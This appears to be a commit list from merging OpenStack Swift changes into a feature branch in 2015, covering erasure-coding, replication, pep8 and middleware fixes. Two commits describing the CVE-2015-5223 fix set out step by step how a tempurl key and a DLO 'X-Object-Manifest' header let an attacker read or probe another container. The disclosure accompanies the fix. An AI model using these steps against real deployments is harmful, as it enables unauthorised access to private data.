Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.

Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661

commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51

Author: Clay Gerrard <email address hidden>

Date: Thu Aug 27 18:35:09 2015 -0700

Make ssync\_sender send valid chunked requests

The connect method of ssync\_sender tells the remote connection that it's

    going to send a valid HTTP chunked request, but if the remote end needs

    to respond with an error of any kind sender throws HTTP right out the

    window, picks up his ball, and closes the socket down hard - much to the

    surprise of the eventlet.wsgi server who up to this point had been

    playing along quite nicely with this 'SSYNC' nonsense assuming that

    everyone here is consenting mature adults.

If you're going to make a "Transfer-Encoding: chunked" request have the

    good decency to finish the job with a proper '0\r\n\r\n'. [1]

N.B. It might be possible to handle an error status during the

    initialize\_request phase with some sort of 100-continue support, but

    honestly it's not entirely clear to me when the server isn't going to

    close the connection if the client is still expected to send the body

    [2] - further if the error comes later during missing\_check or updates

    we'll for sure want to send the chunk transfer termination line before

    we close down the socket and this way we cover both.

1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]

    2. <https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html>

    3. <https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5>

Closes-[Bug #1489587](/bugs/1489587)

    Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf

commit 993ee4e37af1961adba2047d5aa2eb210e423eb3

Author: nakagawamsa <email address hidden>

Date: Fri Aug 28 11:49:43 2015 +0900

Remove duplicate X-Backend-Storage-Policy-Index key

There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.

    One key has fixed policy index value, and another ha...

Reviewed: https://review.openstack.org/219775
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=257e468e9bfd1088040419ad408106ac3c77b531
Submitter: Jenkins
Branch: feature/crypto
commit e02609c66a804845672413b06830b87395afef31
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Sep 1 15:19:50 2015 -0700
Preserve traceback in swift-dispersion-report
Commit c690bcb fixed a bug in the dispersion report, but changed this
from a bare "raise" to "raise err", which loses the traceback. Not a
big deal, but worth putting back IMO.
Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc
commit d06d4ad0fd2dfe69da8008e729651264522c6c06
Author: Minwoo Bae <minwoob@us.ibm.com>
Date: Tue Sep 1 15:08:44 2015 -0500
Included reference in swift.obj.diskfile to enumerate the string
used for data file paths.
Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5
commit 524c89b7eeff037b8a6b421888771e15f98c2da2
Author: John Dickinson <me@not.mn>
Date: Fri Aug 21 13:39:41 2015 -0700
Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.
Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661
commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Aug 27 18:35:09 2015 -0700
Make ssync\_sender send valid chunked requests
The connect method of ssync\_sender tells the remote connection that it's
going to send a valid HTTP chunked request, but if the remote end needs
to respond with an error of any kind sender throws HTTP right out the
window, picks up his ball, and closes the socket down hard - much to the
surprise of the eventlet.wsgi server who up to this point had been
playing along quite nicely with this 'SSYNC' nonsense assuming that
everyone here is consenting mature adults.
If you're going to make a "Transfer-Encoding: chunked" request have the
good decency to finish the job with a proper '0\r\n\r\n'. [1]
N.B. It might be possible to handle an error status during the
initialize\_request phase with some sort of 100-continue support, but
honestly it's not entirely clear to me when the server isn't going to
close the connection if the client is still expected to send the body
[2] - further if the error comes later during missing\_check or updates
we'll for sure want to send the chunk transfer termination line before
we close down the socket and this way we cover both.
1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]
2. https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html
3. https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5
Closes-Bug #1489587
Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf
commit 993ee4e37af1961adba2047d5aa2eb210e423eb3
Author: nakagawamsa <nakagawamsa@nttdata.co.jp>
Date: Fri Aug 28 11:49:43 2015 +0900
Remove duplicate X-Backend-Storage-Policy-Index key
There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.
One key has fixed policy index value, and another has random value.
Unittest should done with random policy index, so remove key which is set fixed value.
Change-Id: Ic91fcf44d48297d0feee33c928ca682def9790a3
commit 893f30c61d280804e417790dd34ba7bc3fb4f6fc
Author: paul luse <paul.e.luse@intel.com>
Date: Wed Aug 12 13:32:50 2015 -0700
EC GET path: require fragments to be of same set
And if they are not, exhaust the node iter to go get more. The
problem without this implementation is a simple overwrite where
a GET follows before the handoff has put the newer obj back on
the 'alive again' node such that the proxy gets n-1 fragments
of the newest set and 1 of the older.
This patch bucketizes the fragments by etag and if it doesn't
have enough continues to exhaust the node iterator until it
has a large enough matching set.
Change-Id: Ib710a133ce1be278365067fd0d6610d80f1f7372
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Closes-Bug: 1457691
commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
Closes-Bug: 1449212
commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
Closes-Bug: 1453948
commit c690bcb68331818a04c94741b25f40cc40f7b3c4
Author: Kazuhiro MIYAHARA <miyahara.kazuhiro@lab.ntt.co.jp>
Date: Mon Aug 17 16:50:56 2015 +0900
Fix dispersion-reports error message
This patch fixes Swift to show message
"No objects to query. Has swift-dispersion-populate been run?"
for "swift-dispersion-report —object-only”
with no container for object dispersion.
Change-Id: I82da56709cfc296a27f5180681709bc56adbc13d
Closes-Bug: #1468120
commit 8086a0e53406dc95856df2d3e015d3eaaf81380a
Author: Tushar Gohad <tushar.gohad@intel.com>
Date: Tue Aug 18 07:24:19 2015 +0000
Restrict PyECLib version to 1.0.7
v1.0.9 rev of PyECLib replaces Jerasure with a native EC
implementation (liberasurecode\_rs\_vand) as the default
EC scheme. Going forward, Jerasure will not be bundled
with PyPI version of PyECLib as it used to be, until
v1.0.7.
This is an interim change to Swift requirements until we
get v1.0.9 PyECLib included into global-requirements and
ready patches that change Swift default ec\_type (for doc,
config samples and unit tests) from "jerasure\_rs\_vand"
to "liberasurecode\_rs\_vand."
Change-Id: Ica4fee2cdea2bc7f5edd0e51ad637a4457faf3b4
commit 17efa343c605d0361b3f423696babbab3f3d972d
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 6 13:21:40 2015 -0700
Fix EC GET backend stream iteration state
In EC case, When GET object requested, proxy-server always makes a log
line "Client disconnected on read" even though the request succeeded.
That is because ECAppIter class doesn't maintain a bunch of backend
stream when closing the app\_iter. It will cause unfortunately
GeneratorExit on backend stream ResumingGetter.
This patch fixes to set non\_client\_disconnected to propagate the state
to the backend streams when the range iteration stopped successful.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I77af9807816bea1444d66534a17e2a210bcf09f8
Closes-Bug: #1472201
commit 25dc7224b63b039cb3778cca7f9f81f954c6d94e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Aug 25 11:05:41 2015 +0100
Fix swob.Range docstring
Bad ranges cause a ValueError to be raised, not an empty
ranges list.
Change-Id: I118bd2f7dc08ff5198870f4093c6eb350506c8ed
commit a7b84f4c51207608adc3a5de7f4f9a629053c0ab
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Aug 24 23:11:34 2015 -0700
Allow pep8 of a single file
Now you can run
$ tox -e pep8 path/to/file.py [path/to/file2.py [...]]
to run pep8 against just those files[1]. This is quite a bit faster
than a full pep8 run, and the faster feedback is nice when you're
fiddling with some formatting to placate pep8.
Of course, you can still run "tox -e pep8" to check the whole source
tree, just as before this commit.
[1] It'll still run against bin/swift\* as well, but that's still a lot
faster than running against all our .py files.
Change-Id: I81b4363fb95a34ff0f5c346b2b24f2047154f502
commit 6a35d479e8952c854fee6fbef9fe0397a289a6e5
Author: Matthew Oliver <matt@oliver.net.au>
Date: Tue Aug 25 11:24:49 2015 +1000
Follow up patch to fix a multiline import NITPIC
This change cleans up test/unit/obj/test\_replicator.py's imports
to use only 1 version of multiline import syntaxes (' \' vs '()').
I don't really mind which, but we should be consistant, at least
in the same file.
This is a follow up for patch 215857.
Change-Id: Ie2d328c25865b19092c493981a803ee246a9d7a5
commit edde5584affaa983d8db1d294bf1e20a2d4bbb50
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Tue Aug 25 07:52:18 2015 +0900
Fix typo of a comment in replicator
The typo was introduced by patch 138342 (sorry) so I fix it.
Change-Id: Id5126802d281ef7ee9be128bd2152c0d2584160e
commit 6151c6c45da481c0ea9a4fb876d14b39c1e347bf
Author: Tim Burke <tim.burke@gmail.com>
Date: Mon Aug 24 20:36:22 2015 +0000
Fix use of delimiter in account listings
Previously, account listings that used the delimiter query param could
omit some containers if they ended with the character that follows the
delimiter.
See If196e3075612b121ef8da4a9128167d00a248c27 for the corresponding fix
for container listings.
Change-Id: I57fcb97e51f653f5f4e306a632fcb3a0fb148c4e
commit a38f63e1c6b8b85b1675aa900e239a2e9906811e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 18:14:55 2015 -0700
Use correct Storage-Policy header for REPLICATE requests
Under some concurrency the object-replicator could potentially send the
wrong X-Backed-Storage-Policy-Index header to it's partner nodes during
replication if there were multiple storage policies on the same node
because of a race where multiple jobs being processed concurrently would
mutate some shared state on the ObjectReplicator instance.
Instead of using shared stated on the ObjectReplicator instance when
mutating the default headers send with REPLICATION requests each job
will copy them into a local where they can safely be updated.
Change-Id: I5522db57af7e308b1f9d4181f14ea14e386a71fd
commit ae129bf5e8c918efd8ee66279f98ee85e7c97b24
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Fri May 15 06:44:12 2015 -0700
eventlet.posthook related code needn't anymore
In the past, older Swift seemed to use eventlet.posthooks scheme for the
logging on proxy with posthooklogger method. However, for now, Swift
attaches no method to eventlet.posthooks everywhere so we don't have
to maintain the posthooks anymore.
Change-Id: Ie63941a202d448532d980252a4d25575f8edab9c
commit 4500ff340f021e4e5f6fd53960de03cb3c207925
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed May 13 00:43:59 2015 -0700
Fix the missing SLO state on fast-post
When using fast-post and POST (i.e. metadata update) is requested to
a SLO manifest files, current Swift drops the 'X-Static-Large-Object'
header from the existing metadata. It results in breaking the SLO
state because the manifest missing the 'X-Static-Large-Object' metadata
will be maintained as a normal files.
This patch fixes object-server to keep the existing
'X-Static-Large-Object' flag and then keep the SLO state.
Change-Id: Ib1eb569071372c322dd105c52baeeb094003291e
Closes-bug: #1453807
commit 69e7424d3cb6c59341d739c3d41f42397031d96a
Author: Eran Rom <eranr@il.ibm.com>
Date: Tue Jul 28 09:41:12 2015 +0300
Add container sync probe test to SAIO default set
SAIO Configuration and documentation changes enabling to run the
container sync probe test by default
Change-Id: Iccf59533d0d4fe72549d318339ab125d04dde006
Related-Bug: #1476623
commit 8b1df9918bf6c22b49b161a402199b532bfd8266
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 14:04:46 2015 -0700
Minor cleanup handoff mode warnings
\* message is a little clearer
\* test is a little stronger
Change-Id: I745cde7f4a46dafc80ab42d39e6ccc92aa3b746e
commit a1ceab5a92dfdafd5abffed272ac2cece5302f32
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Fri Aug 21 14:14:31 2015 -0400
New troubleshooting case in documentation.
Added a new troubleshooting case for the "First Contribution to Swift"
documentation page.
Change-Id: I182ba702b49b28409fe56becae93326e5f63dcd0
commit ab163702de733be39ba5e7024c7a8dd4c86bc29b
Author: Pradeep Kumar Singh <pradeep.singh@nectechnologies.in>
Date: Tue Jul 14 10:03:18 2015 +0530
Emit warning log in object replicator
When the object-replicator encounters handoffs\_first and
handoff\_delete options as enabled it should emit a log
warning indicating that it should be changed back to the
default before the next "normal" rebalance.
Closes-Bug: #1457262
Change-Id: If9dc2796c18ed3cf13da920831e2d5c2ae9f12a0
commit be66aa8e76d2994eb8a0a944e0dea26ffbb3c159
Author: Samuel Merritt <sam@swiftstack.com>
Date: Thu Aug 20 13:24:38 2015 -0700
Fix 500 for bogus Range request to 0-byte object.
The proxy was trying to pop a byterange off a Range header that didn't
contain syntactically-valid byteranges. This worked about as well as
you'd expect. Now we detect the bogus value and remove the header
entirely.
Change-Id: I24b92f900d33ec79880c7db2870378489d5a6810
commit 4b6836b3bc465e9c2c6d2974c193a49b973c4e4e
Author: Akihito Takai <takaiak@nttdata.co.jp>
Date: Thu Aug 20 18:40:52 2015 +0900
Fix the comment in [1].
(line 259) parameter(op) of object\_update method is 'PUT' or
'DELETE' not 'POST' or 'DELETE'.
[1]: swift/obj/updater.py
Change-Id: I876a620ba8e09e69fba7156b12e69445c229e160
commit 923238aa1ba0963c414ba5321cd3910b2910f4ed
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 20:35:25 2015 +0530
test/(functional/probe):Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I416c6ac21ccbfb91ec328ffb1ed21e492ef52d58
commit 47dc31940d64b0c87e99cc73eddcdd01dd8b3ad4
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Aug 19 10:42:28 2015 -0700
Add OpenStack release names to changelog
I can never remember the mapping of real version numbers to the
OpenStack names.
Change-Id: Ib7c5ae4ff2a33018364698eb34f8df1622719fab
commit 183508710d011ec30ebba2186c58fd28d449e4bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:18:49 2015 +0200
pep8: Don't override '\_' symbol
Fix pep8 warning F402 "import '\_' from line 51 shadowed by loop
variable".
Change-Id: I139060ff5d298a8b0f0f8e529a5737478fb5daf5
commit c7eb589c6ca2fe4f2950cae22a18513e4dec6c46
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:06:52 2015 +0200
pep8: Fix usage of the l10n \_('...') function
Fix the pep8 warning H702 "Formatting operation should be outside of
localization method call".
For the logger, pass parameters as indexed parameters instead of using
the string str%args operator, the logger is more reliable in case of
formatting error.
Change-Id: If418bc155f6a6c0a00f63e3d87ebe4addf4aae55
commit 7bea148d2fe22daa9d1fbbc5cd16ebd390b64b1b
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 10:34:26 2015 +0200
pep8: replace deprecated calls to assert\_()
The TestCase.assert\_() has been deprecated in Python 2.7. Replace it
with assertTrue() or even better methods (assertIn, assertNotIn,
assertIsInstance) which provide better error messages.
Change-Id: I21c730351470031a2dabe5238693095eabdb8964
commit 8aaacbf88d9ea4432e58dd261b98ff95d7c69be6
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 18:55:01 2015 +0200
pep8: Fix hacking H232 warnings (octal)
Fix warnings "H232: Python 3.x incompatible octal 000001234 should be
written as 0o1234".
Change-Id: I9a7bbb034357783885ac3e18fe1e9e32a5951616
commit d6267c1f95a7fcd2b0e4f15d5efc6bcfe2114de0
Author: Clément Contini <ccontini@cloudops.com>
Date: Wed Aug 12 15:00:45 2015 -0400
Keep user id and project id in subrequests env
Keep HTTP\_X\_USER\_ID and HTTP\_X\_PROJECT\_ID to be available as
user\_id and project\_id in storage.objects.outgoing.bytes in
ceilometer when downloading a multipart object.
Change-Id: I0f4734f021e5d6e84d48ed9bebeb321d7a9590ad
Closes-Bug: #1477283
commit eaa006464cb98a2f36809edfa13bd3dcaebc9952
Author: John Dickinson <me@not.mn>
Date: Mon Aug 17 22:13:42 2015 -0700
move global statement up a few lines
Change-Id: I190d2d530c6c0525d988cc88b0965b48a291fffb
commit 1a81cda8b7eba0d25ea7341da756bb588cae8d73
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Mon Aug 3 17:45:56 2015 -0400
Doc instructions for post rebase steps
Improve the 'first\_contribution\_swift' by adding instructions for how to
rebuild swift following a rebase.
Change-Id: If5c91dc4e1e8d1712bbd8b326c675967fb4b8c15
commit 79ba4a85983641e539b620bd143e62673c98416e
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Wed Dec 3 06:15:16 2014 +0900
Enable Object Replicator's failure count in recon
This patch makes the count of object replication failure in recon.
And "failure\_nodes" is added to Account Replicator and
Container Replicator.
Recon shows the count of object repliction failure as follows:
$ curl http://<ip>:<port>/recon/replication/object
{
"replication\_last": 1416334368.60865,
"replication\_stats": {
"attempted": 13346,
"failure": 870,
"failure\_nodes": {
"192.168.0.1": {"sdb1": 3},
"192.168.0.2": {"sdb1": 851,
"sdc1": 1,
"sdd1": 8},
"192.168.0.3": {"sdb1": 3,
"sdc1": 4}
},
"hashmatch": 0,
"remove": 0,
"rsync": 0,
"start": 1416354240.9761429,
"success": 1908
},
"replication\_time": 2316.5563162644703,
"object\_replication\_last": 1416334368.60865,
"object\_replication\_time": 2316.5563162644703
}
Note that 'object\_replication\_last' and 'object\_replication\_time' are
considered to be transitional and will be removed in the subsequent
releases. Use 'replication\_last' and 'replication\_time' instead.
Additionaly this patch adds the count in swift-recon and it will be
showed as follows:
$ swift-recon object -r
========================================================================
=======
--> Starting reconnaissance on 4 hosts
========================================================================
=======
[2014-11-27 16:14:09] Checking on replication
[replication\_failure] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_success] low: 3, high: 3, avg: 3.0, total: 12,
Failed: 0.0%, no\_result: 0, reported: 4
[replication\_time] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_attempted] low: 1, high: 1, avg: 1.0, total: 4,
Failed: 0.0%, no\_result: 0, reported: 4
Oldest completion was 2014-11-27 16:09:45 (4 minutes ago) by
192.168.0.4:6002.
Most recent completion was 2014-11-27 16:14:19 (-10 seconds ago) by
192.168.0.1:6002.
========================================================================
=======
In case there is a cluster which has servers, a server runs with this
patch and the other servers run without this patch. If swift-recon
executes on the server which runs with this patch, there are unnecessary
information on the output such as [failure], [success] and [attempted].
Because other servers which run without this patch are not able to
send a response with information that this patch needs.
Therefore once you apply this patch, you also apply this patch to other
servers before you execute swift-recon.
DocImpact
Change-Id: Iecd33655ae2568482833131f422679996c374d78
Co-Authored-By: Kenichiro Matsuda <matsuda\_kenichi@jp.fujitsu.com>
Co-Authored-By: Brian Cline <bcline@softlayer.com>
Implements: blueprint enable-object-replication-failure-in-recon
commit eeb0fa40a19917e6548f95f0bd3c08736928449b
Author: Christian Schwede <cschwede@redhat.com>
Date: Thu Aug 6 07:21:15 2015 +0000
Make swift-ring-builder filename usage more consistent
Sometimes the given argument is internally altered and another filename is used
without a note to the operator. Even worse, a given .ring.gz filename is
sometimes written out as builder file, without updating the corresponding
.builder file.
There is already a method to parse the given argv and return the name of the
builder and ring file. However, it's rarely used and no warning is given to the
user if it is altered. This patch uses the already parsed builder and ring file
name instead of argv[1], and also adds a note to the user if the used filename
is differently to the one given as argument.
Closes-Bug: 1482096
Change-Id: I2f8ef23aeab8b07caaa799f7dcd57e684b4b2ad2
commit b75d2a4e37d4c86763a2cc56c6dd53ebe2e0de19
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Mon Aug 17 13:54:44 2015 -0500
Quorum on durable response is too low
Increase the .durable quorum from 2 to "parity + 1" to guarantee
that we will never fail to rebuild an object. Otherwise, with
low durable responses back (< parity + 1), the putter objects
return with failed attribute set to true, thereby failing the
rebuild of fragments for an object.
Change-Id: I80d666f61273e589d0990baa78fd657b3470785d
Closes-Bug: 1484565
commit fa35e38c9f83f704eb087f80157cbe33b23b9db2
Author: Kai Zhang <zakir.exe@gmail.com>
Date: Fri Aug 14 16:46:35 2015 -0700
Fix some minor typos
Fixed some typos in function name and comments.
Change-Id: Ida76ab4b331a51b71e57650702acc136e66ba4b2
commit 5b246e875fe9ac3d764ea581ad52b04238f5bcc8
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed Jul 22 10:39:22 2015 -0700
Fix EC range GET/COPY handling
When range GET (or COPY) for an EC object requested, if the requested range
starts from more than last segments alignment (i.e.
ceil(object\_size/segment\_size) \* segment\_size), proxy server will return
the original content length w/o body, though Swift should return an error
massage as a body and the length of message as the content length.
The current behavior will cause stuck on some client. (e.g. curl)
This patch fixes that proxy enables to return correct response, even if such
an over range requested.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I21f81c842f563ac4dddc69011ed759b744bb20bd
Closes-Bug: #1475499
commit 7064706b2721c36c5181267f58704b9344ad4ac0
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 10:17:20 2015 -0500
Fix 500 in versioned writes with bad Destination
When this code lived in the proxy, it was protected by an "except
HTTPException" clause in proxy.Application.handle\_request(). When it
moved to middleware, it lost that, and then things like
constraints.check\_name\_format that raised HTTPException would cause
500s. The HTTPException would make it all the way out to catch\_errors
and get translated to a 500.
This commit just wraps a couple try/excepts around the bits in
versioned writes that can raise HTTPException. I tried to make it use
wsgify so I could get that for free, but that wound up being a real
pain because env/start\_response are plumbed through pretty much the
whole versioned-writes middleware.
Closes-Bug: 1483705
Change-Id: Ife165bf709e64f313ed07c779b21914045e51f25
commit 035a411660ca02983cd486312266c67d78a2359c
Author: Thiago da Silva <thiago@redhat.com>
Date: Sun Nov 9 13:13:27 2014 -0500
versioned writes middleware
Rewrite object versioning as middleware to simplify the PUT method
in the object controller.
The functionality remains basically the
same with the only major difference being the ability to now
version slo manifest files. dlo manifests are still not
supported as part of this patch.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
DocImpact
Change-Id: Ie899290b3312e201979eafefb253d1a60b65b837
Signed-off-by: Thiago da Silva <thiago@redhat.com>
Signed-off-by: Prashanth Pai <ppai@redhat.com>
commit 968c91a465627bb9317ed6e2ae9ccd818c83c0c4
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jul 28 10:31:54 2015 +0100
Replace assertTrue(not <condition>) with assertFalse(<condition>)
The replacement of assert\_ with assertTrue [1] resulted in a number of
tests using calls of the form assertTrue(not <condition>). This patch
replaces those with assertFalse(<condition>).
[1] change I74705c6498249337bfdf955d62e0ad972035bc1f
Change-Id: I78b49558f4425c2335df187b1793d1e4b3c514b1
commit 4ac1fea5d111c669ff827f4eb29c0735cbad6ba5
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 22:07:01 2015 +0800
Fix some spelling typo in comments
s/overide/override for object-expirer.conf and sample.
s/automaticaly/automatically for swift/proxy/controllers/obj.py
Change-Id: Ife107c7a1005a5d4959288db50a7f8f33c522dd4
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit 9456af35a2832aeafc4a4e78ebd0d4142ead71cd
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:55:36 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3,changes in
dir:
\*test/unit/obj/\*
\*test/unit/test\_locale/\*
Change-Id: I3dd0c1107165ac529f1cd967363e5cf408a1d02b
commit 1952451ed7e97e2bfa3b11dfa5000cc39f712084
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 21:57:08 2015 +0800
Fix a spelling typo in comment
s/automaticaly/automatically/ for swift/proxy/controllers/obj.py
Change-Id: I405441383739637e0b13746d6f4e2bad1c874b4d
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit c35cc13b8abeb97400632cbe8ec56fc1040d8210
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 10:01:17 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/unit/proxy/\*
Change-Id: Ie2c7e73e1096233a10ee7fbf6f88386fa4d469d6
commit 239e94e62518f36601fb18119700269753d02a01
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 09:28:51 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/probe/\*
Change-Id: Ie08dd7a8a6c48e3452dfe4f2b41676330ce455d5
commit 49b9ba37ac522502ccad66fba7bfef375eab145d
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Wed Aug 5 14:51:32 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/functional/\*
Change-Id: Iee7f8ffca9838ccc521107180697d91ac9559405
commit 81816bebe6b3506af8cabaa7ebe265c70f3499cd
Author: kenichiro matsuda <matsuda\_kenichi@jp.fujitsu.com>
Date: Thu Aug 6 10:13:02 2015 +0900
Fix shebang of commands
Fix shebang of following commands.
$ grep '#!/usr/bin/python' swift/bin/\*
swift/bin/swift-account-info:#!/usr/bin/python
swift/bin/swift-container-info:#!/usr/bin/python
swift/bin/swift-container-sync:#!/usr/bin/python
swift/bin/swift-recon:#!/usr/bin/python
swift/bin/swift-ring-builder:#!/usr/bin/python
swift/bin/swift-ring-builder-analyzer:#!/usr/bin/python
Change-Id: I564d1d8abd76eba57730fc2f30263b0a0f809867
Closes-Bug: #1481623
commit 652f0f9da408e955843f87a504b3dab5be3cff80
Author: Pete Zaitcev <zaitcev@kotori.zaitcev.us>
Date: Wed Aug 5 15:33:29 2015 -0600
Having said H, I, J, we ought to say K
In the long run, we might want to stop these updates. But this
decision is above my pay grade.
Change-Id: I335558e1da8052be1b215fbad51244b47af3d81b
commit ed3aec2146b114c85bb3b196c999bf3f44fe159e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:18:52 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir: test/unit/container/\*
Change-Id: I3333022ed63ce03198bc73147246d91d2442a440
commit f449e914728fdcaf0870c15b9fc5ebd16a9df916
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:32:02 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3, fixing in:
dir: test/unit/cli/\*
Change-Id: I9a2fc1f717beafd5fa8408942046e310e8de0318
commit 6594bbebb582801c069c4966352fee19eadef2f8
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:25:46 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir : test/unit/account/\*
